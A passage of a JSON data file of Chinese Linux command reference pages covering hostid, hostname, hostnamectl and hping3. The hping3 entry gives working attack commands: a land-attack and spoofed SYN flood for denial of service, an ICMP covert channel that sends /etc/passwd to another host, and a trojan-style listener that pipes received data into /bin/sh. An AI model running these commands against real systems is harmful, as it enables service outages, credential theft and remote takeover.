class=\"hljs-number\">104</span>.<span class=\"hljs-number\">15</span><span class=\"hljs-comment\">#53 in 0 ms</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "hostid",
        "des": "显示当前主机的十六进制数字标识。",
        "body": "<h1 id=\"hostid\">hostid</h1>\n<p>显示当前主机的十六进制数字标识。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">hostid [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示当前主机的十六进制标识符。</li>\n<li>用来限制软件的使用权限，不可改变。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help       显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version    显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># hostid</span>\n<span class=\"hljs-number\">007</span>f0100\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 hostid</code>，<code>info coreutils 'hostid invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "hostname",
        "des": "显示和设置系统的主机名",
        "body": "<h1 id=\"hostname\">hostname</h1>\n<p>显示和设置系统的主机名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>hostname命令</strong> \n用于显示和设置系统的主机名称。</p>\n<ul>\n<li>环境变量 <code>HOSTNAME</code> 也保存了当前的主机名。</li>\n<li>在使用 <code>hostname</code> 命令设置主机名后，系统并不会永久保存新的主机名，重启之后还是原来的主机名。如果需要永久修改主机名，需要修改 <code>/etc/hosts</code> 和 <code>/etc/sysconfig/network</code> 的相关内容并进行重启；也可以使用 <code>hostnamectl</code> 命令进行永久修改。</li>\n</ul>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">hostname [-b] {hostname|<span class=\"hljs-type\">-F</span> file}           设置主机名称（或从文件获取）\nhostname [-a|<span class=\"hljs-type\">-A</span>|<span class=\"hljs-type\">-d</span>|<span class=\"hljs-type\">-f</span>|<span class=\"hljs-type\">-i</span>|<span class=\"hljs-type\">-I</span>|<span class=\"hljs-type\">-s</span>|<span class=\"hljs-type\">-y</span>]         显示格式化的名称\nhostname                                   显示主机名称\n\n{yp,nis,}domainname {nisdomain|<span class=\"hljs-type\">-F</span> file}    设置 NIS 主机名称（或从文件获取）\n{yp,nis,}domainname                        显示 NIS 主机名称\n\ndnsdomainname                              显示 DNS 主机名称\n\nhostname -V|<span class=\"hljs-type\">--version</span>|<span class=\"hljs-type\">-h</span>|<span class=\"hljs-type\">--help</span>            打印信息并退出\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">a</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">alias</span>               <span class=\"hljs-comment\">显示主机别名</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">A</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">all</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">fqdns</span>           <span class=\"hljs-comment\">显示所有FQDN名称</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">b</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">boot</span>                <span class=\"hljs-comment\">如果没有可用的主机名，则设置默认主机名</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">d</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">domain</span>              <span class=\"hljs-comment\">显示DNS域名</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">fqdn</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">long</span>        <span class=\"hljs-comment\">显示FQDN名称</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">F</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">file</span>                <span class=\"hljs-comment\">从给定文件中读取主机名或NIS域名</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">i</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">ip</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">address</span>          <span class=\"hljs-comment\">显示主机的ip地址</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">I</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">all</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ip</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">addresses</span>    <span class=\"hljs-comment\">显示主机所有的ip地址</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">short</span>               <span class=\"hljs-comment\">显示短主机名称，在第一个点处截断</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">y</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">yp</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">nis</span>           <span class=\"hljs-comment\">显示NIS域名</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>显示主机名</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@AY1307311912260196fcZ</span> ~]<span class=\"hljs-meta\"># hostname</span>\nAY1307311912260196fcZ\n</code></pre>\n<p>临时改变主机名</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@AY1307311912260196fcZ</span> ~]<span class=\"hljs-meta\"># hostname newname</span>\n</code></pre>\n<p>显示主机的所有IP地址</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[root@AY1307311912260196fcZ ~]</span># hostname -I\n<span class=\"hljs-number\">10.17.0.1</span> <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">18</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">172</span>.<span class=\"hljs-number\">17</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">1</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "hostnamectl",
        "des": "查询或更改系统主机名",
        "body": "<h1 id=\"hostnamectl\">hostnamectl</h1>\n<p>查询或更改系统主机名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>hostnamectl可用于查询和更改系统主机名和相关设置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-bash\">hostnamectl [选项<span class=\"hljs-string\">...</span>] 指令 <span class=\"hljs-string\">...</span>\n</code></pre>\n<h3 id=\"指令\">指令</h3>\n<pre><code class=\"language-bash\"><span class=\"hljs-string\">status</span>                 显示当前主机名设置\n<span class=\"hljs-built_in\">set-hostname</span> <span class=\"hljs-string\">NAME</span>      设置系统主机名\n<span class=\"hljs-built_in\">set-icon-name</span> <span class=\"hljs-string\">NAME</span>     设置主机的图标名称\n<span class=\"hljs-built_in\">set-chassis</span> <span class=\"hljs-string\">NAME</span>       设置主机的机箱类型 \n<span class=\"hljs-built_in\">set-deployment</span> <span class=\"hljs-string\">NAME</span>    设置主机的部署环境 \n<span class=\"hljs-built_in\">set-location</span> <span class=\"hljs-string\">NAME</span>      设置主机位置\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-bash\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">h</span> --<span class=\"hljs-comment\">help</span>               <span class=\"hljs-comment\">显示此帮助</span>\n    --<span class=\"hljs-comment\">version</span>           <span class=\"hljs-comment\">显示包的版本</span>\n    --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ask</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">password</span>   <span class=\"hljs-comment\">不提示输入密码</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">H</span> --<span class=\"hljs-comment\">host=</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">USER@</span><span class=\"hljs-title\">]</span><span class=\"hljs-comment\">HOST</span>   <span class=\"hljs-comment\">在远程主机上操作</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">M</span> --<span class=\"hljs-comment\">machine=CONTAINER</span>  <span class=\"hljs-comment\">在本地容器上执行操作。指定要连接到的容器名称。</span>\n--<span class=\"hljs-comment\">transient</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">static</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">pretty</span>  \n                        <span class=\"hljs-comment\">如果调用了status（或者没有给出显式命令）并且指定了其中一个开关，hostnamectl将只打印出这个选定的主机名。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>显示主机名设置</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-variable\">$ </span>hostnamectl status\n</code></pre>\n<p>改变主机名(永久修改,不用重启哦~)</p>\n<pre><code class=\"language-bash\">$ <span class=\"hljs-string\">sudo</span> <span class=\"hljs-string\">hostnamectl</span> <span class=\"hljs-built_in\">set-hostname</span> <span class=\"hljs-string\">newname</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "hping3",
        "des": "测试网络及主机的安全",
        "body": "<h1 id=\"hping3\">hping3</h1>\n<p>测试网络及主机的安全</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>hping</strong> 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p>\n<h3 id=\"安装\">安装</h3>\n<pre><code class=\"language-shell\">yum install libpcap-devel tc-devel\nln -s <span class=\"hljs-regexp\">/usr/i</span>nclude<span class=\"hljs-regexp\">/pcap-bpf.h /u</span>sr<span class=\"hljs-regexp\">/include/</span>net/bpf.h\nwget http:<span class=\"hljs-regexp\">//</span>www.hping.org/hping3-<span class=\"hljs-number\">20051105</span>.tar.gz\ntar zxvf hping3-<span class=\"hljs-number\">20051105</span>.tar.gz\ncd hping3-<span class=\"hljs-number\">20051105</span>\n./configure\nmake\nmake install\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">H</span> --<span class=\"hljs-comment\">help</span> <span class=\"hljs-comment\">显示帮助。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">v</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">VERSION</span> <span class=\"hljs-comment\">版本信息。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">c</span> --<span class=\"hljs-comment\">count</span> <span class=\"hljs-comment\">count</span> <span class=\"hljs-comment\">发送数据包的次数</span> <span class=\"hljs-comment\">关于countreached_timeout</span> <span class=\"hljs-comment\">可以在hping2</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">h里编辑。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">i</span> --<span class=\"hljs-comment\">interval</span> <span class=\"hljs-comment\">包发送间隔时间（单位是毫秒）缺省时间是1秒</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">此功能在增加传输率上很重要</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">在idle/spoofing扫描时此功能也会被用到</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">你可以参考hping</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">howto获得更多信息</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">fast</span> <span class=\"hljs-comment\">每秒发10个数据包。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">n</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">nmeric</span> <span class=\"hljs-comment\">数字输出，象征性输出主机地址。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">q</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">quiet</span> <span class=\"hljs-comment\">退出。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">I</span> --<span class=\"hljs-comment\">interface</span> <span class=\"hljs-comment\">interface</span> <span class=\"hljs-comment\">name</span> <span class=\"hljs-comment\">无非就是eth0之类的参数。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">v</span> --<span class=\"hljs-comment\">verbose</span> <span class=\"hljs-comment\">显示很多信息，TCP回应一般如：len=46</span> <span class=\"hljs-comment\">ip=192</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">168</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1</span> <span class=\"hljs-comment\">flags=RADF</span> <span class=\"hljs-comment\">seq=0</span> <span class=\"hljs-comment\">ttl=255</span> <span class=\"hljs-comment\">id=0</span> <span class=\"hljs-comment\">win=0</span> <span class=\"hljs-comment\">rtt=0</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">4ms</span> <span class=\"hljs-comment\">tos=0</span> <span class=\"hljs-comment\">iplen=40</span> <span class=\"hljs-comment\">seq=0</span> <span class=\"hljs-comment\">ack=1380893504</span> <span class=\"hljs-comment\">sum=2010</span> <span class=\"hljs-comment\">urp=0</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">D</span> --<span class=\"hljs-comment\">debug</span> <span class=\"hljs-comment\">进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE</span> <span class=\"hljs-comment\">DETECTION</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">DATA</span> <span class=\"hljs-comment\">LINK</span> <span class=\"hljs-comment\">LAYER</span> <span class=\"hljs-comment\">ACCESS</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">INTERFACE</span> <span class=\"hljs-comment\">SETTINGS</span><span class=\"hljs-string\">,</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">）</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">z</span> --<span class=\"hljs-comment\">bind</span> <span class=\"hljs-comment\">快捷键的使用。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">Z</span> --<span class=\"hljs-comment\">unbind</span> <span class=\"hljs-comment\">消除快捷键。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">O</span> --<span class=\"hljs-comment\">rawip</span> <span class=\"hljs-comment\">RAWIP模式，在此模式下HPING会发送带数据的IP头。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">1</span> --<span class=\"hljs-comment\">icmp</span> <span class=\"hljs-comment\">ICMP模式，此模式下HPING会发送IGMP应答报，你可以用</span>--<span class=\"hljs-comment\">ICMPTYPE</span> --<span class=\"hljs-comment\">ICMPCODE选项发送其他类型/模式的ICMP报文。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">2</span> --<span class=\"hljs-comment\">udp</span> <span class=\"hljs-comment\">UDP</span> <span class=\"hljs-comment\">模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用</span>--<span class=\"hljs-comment\">baseport</span> --<span class=\"hljs-comment\">destport</span> --<span class=\"hljs-comment\">keep选项指定其模式。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">9</span> --<span class=\"hljs-comment\">listen</span> <span class=\"hljs-comment\">signatuer</span> <span class=\"hljs-comment\">hping的listen模式，用此模式，HPING会接收指定的数据。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">a</span> --<span class=\"hljs-comment\">spoof</span> <span class=\"hljs-comment\">hostname</span> <span class=\"hljs-comment\">伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">t</span> --<span class=\"hljs-comment\">ttl time to live 可以指定发出包的TTL值。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">H</span> --<span class=\"hljs-comment\">ipproto</span> <span class=\"hljs-comment\">在RAW</span> <span class=\"hljs-comment\">IP模式里选择IP协议。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">w</span> --<span class=\"hljs-comment\">WINID</span> <span class=\"hljs-comment\">UNIX</span> <span class=\"hljs-string\">,</span><span class=\"hljs-comment\">WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">r</span> --<span class=\"hljs-comment\">rel</span> <span class=\"hljs-comment\">更改ID的，可以让ID曾递减输出，详见HPING</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">HOWTO。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">F</span> --<span class=\"hljs-comment\">FRAG</span> <span class=\"hljs-comment\">更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual</span> <span class=\"hljs-comment\">mtu”是16字节。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">x</span> --<span class=\"hljs-comment\">morefrag</span> <span class=\"hljs-comment\">此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">y</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">dontfrag</span> <span class=\"hljs-comment\">发送不可恢复的IP碎片，这可以让你了解更多的MTU</span> <span class=\"hljs-comment\">PATH</span> <span class=\"hljs-comment\">DISCOVERY。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">G</span> --<span class=\"hljs-comment\">fragoff fragment offset value set</span> <span class=\"hljs-comment\">the</span> <span class=\"hljs-comment\">fragment</span> <span class=\"hljs-comment\">offset</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">m</span> --<span class=\"hljs-comment\">mtu</span> <span class=\"hljs-comment\">mtu</span> <span class=\"hljs-comment\">value</span> <span class=\"hljs-comment\">用此项后ID数值变得很大，50000没指定此项时3000</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">20000左右。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">G</span> --<span class=\"hljs-comment\">rroute</span> <span class=\"hljs-comment\">记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">C</span> --<span class=\"hljs-comment\">ICMPTYPE</span> <span class=\"hljs-comment\">type</span> <span class=\"hljs-comment\">指定ICMP类型，缺省是ICMP</span> <span class=\"hljs-comment\">echo</span> <span class=\"hljs-comment\">REQUEST。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">K</span> --<span class=\"hljs-comment\">ICMPCODE</span> <span class=\"hljs-comment\">CODE</span> <span class=\"hljs-comment\">指定ICMP代号，缺省0。</span>\n--<span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ipver</span> <span class=\"hljs-comment\">把IP版本也插入IP头。</span>\n--<span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">iphlen</span> <span class=\"hljs-comment\">设置IP头的长度，缺省为5（32字节）。</span>\n--<span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">iplen</span> <span class=\"hljs-comment\">设置IP包长度。</span>\n--<span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ipid</span> <span class=\"hljs-comment\">设置ICMP报文IP头的ID，缺省是RANDOM。</span>\n--<span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ipproto</span> <span class=\"hljs-comment\">设置协议的，缺省是TCP。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">cksum</span> <span class=\"hljs-comment\">设置校验和。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ts</span> <span class=\"hljs-comment\">alias</span> <span class=\"hljs-comment\">for</span> --<span class=\"hljs-comment\">icmptype</span> <span class=\"hljs-comment\">13</span> <span class=\"hljs-comment\">(to</span> <span class=\"hljs-comment\">send</span> <span class=\"hljs-comment\">ICMP</span> <span class=\"hljs-comment\">timestamp</span> <span class=\"hljs-comment\">requests)</span>\n--<span class=\"hljs-comment\">icmp</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">addr</span> <span class=\"hljs-comment\">Alias</span> <span class=\"hljs-comment\">for</span> --<span class=\"hljs-comment\">icmptype</span> <span class=\"hljs-comment\">17</span> <span class=\"hljs-comment\">(to</span> <span class=\"hljs-comment\">send</span> <span class=\"hljs-comment\">ICMP</span> <span class=\"hljs-comment\">address</span> <span class=\"hljs-comment\">mask</span> <span class=\"hljs-comment\">requests)</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span> --<span class=\"hljs-comment\">baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">p</span> --<span class=\"hljs-comment\">deskport</span> <span class=\"hljs-title\">[</span><span class=\"hljs-literal\">+</span><span class=\"hljs-title\">]</span><span class=\"hljs-title\">[</span><span class=\"hljs-literal\">+</span><span class=\"hljs-title\">]</span><span class=\"hljs-comment\">desk</span> <span class=\"hljs-comment\">port</span> <span class=\"hljs-comment\">设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。</span>\n--<span class=\"hljs-comment\">keep</span> <span class=\"hljs-comment\">上面说过了。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">w</span> --<span class=\"hljs-comment\">win</span> <span class=\"hljs-comment\">发的大小和windows一样大，64BYTE。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">O</span> --<span class=\"hljs-comment\">tcpoff Set fake tcp data offset. Normal data offset</span> <span class=\"hljs-comment\">is</span> <span class=\"hljs-comment\">tcphdrlen</span> <span class=\"hljs-comment\">/</span> <span class=\"hljs-comment\">4</span><span class=\"hljs-string\">.</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">m</span> --<span class=\"hljs-comment\">tcpseq</span> <span class=\"hljs-comment\">设置TCP序列数。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">l</span> --<span class=\"hljs-comment\">tcpck</span> <span class=\"hljs-comment\">设置TCP</span> <span class=\"hljs-comment\">ack。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">Q</span> --<span class=\"hljs-comment\">seqnum</span> <span class=\"hljs-comment\">搜集序列号的，这对于你分析TCP序列号有很大作用。</span>\n</code></pre>\n<h3 id=\"hping3功能\">Hping3功能</h3>\n<p>Hping3主要有以下典型功能应用：</p>\n<h3 id=\"--防火墙测试\"># &nbsp;防火墙测试</h3>\n<p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href=\"http://0daysecurity.com/articles/hping3_examples.html\">http://0daysecurity.com/articles/hping3_examples.html</a></p>\n<p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">hping3</span> -S  -c <span class=\"hljs-number\">1000000</span> -a <span class=\"hljs-number\">10.10.10.10</span> -p <span class=\"hljs-number\">21</span> <span class=\"hljs-number\">10.10.10.10</span>\n</code></pre>\n<h3 id=\"-端口扫描\"># 端口扫描</h3>\n<p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">hping3</span> -I eth0  -S <span class=\"hljs-number\">192.168.10.1</span> -p <span class=\"hljs-number\">80</span>\n</code></pre>\n<p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>\n<p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>\n<h3 id=\"-idle扫描\"># Idle扫描</h3>\n<p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>\n<p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>\n<h3 id=\"-拒绝服务攻击\"># 拒绝服务攻击</h3>\n<p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">hping3</span> -I eth0 -a<span class=\"hljs-number\">192.168.10.99</span> -S <span class=\"hljs-number\">192.168.10.33</span> -p <span class=\"hljs-number\">80</span> -i u1000\n</code></pre>\n<p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>\n<h3 id=\"-文件传输\"># 文件传输</h3>\n<p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">hping3</span> <span class=\"hljs-comment\">192</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">168</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">159</span>--<span class=\"hljs-comment\">listen</span> <span class=\"hljs-comment\">signature</span> --<span class=\"hljs-comment\">safe</span>  --<span class=\"hljs-comment\">icmp</span>\n</code></pre>\n<p>监听ICMP包中的签名，根据签名解析出文件内容。</p>\n<p>在发送端使用签名打包的ICMP包发送文件：</p>\n<pre><code class=\"language-shell\">hping3 192.168.1.108<span class=\"hljs-params\">--icmp</span> ?d 100 <span class=\"hljs-params\">--sign</span> signature <span class=\"hljs-params\">--file</span> <span class=\"hljs-string\">/etc/passwd</span>\n</code></pre>\n<p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>\n<h3 id=\"-木马功能\"># 木马功能</h3>\n<p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>\n<p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>\n<p>在木马启动端：</p>\n<pre><code class=\"language-shell\">hping3 192.168.10.66<span class=\"hljs-params\">--listen</span> signature <span class=\"hljs-params\">--safe</span> <span class=\"hljs-params\">--udp</span> -p 53 | <span class=\"hljs-string\">/bin/sh</span>\n</code></pre>\n<p>在远程控制端：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-keyword\">ls</span> &gt;test.cmd\nhping3 192.168.10.44 -p53 -d 100 <span class=\"hljs-params\">--udp</span> <span class=\"hljs-params\">--sign</span> siganature <span class=\"hljs-params\">--file</span> <span class=\"hljs-string\">./test.cmd</span>\n</code></pre>\n<p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>\n<p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "htdigest",
        "des": "Apache服务器内置工具",
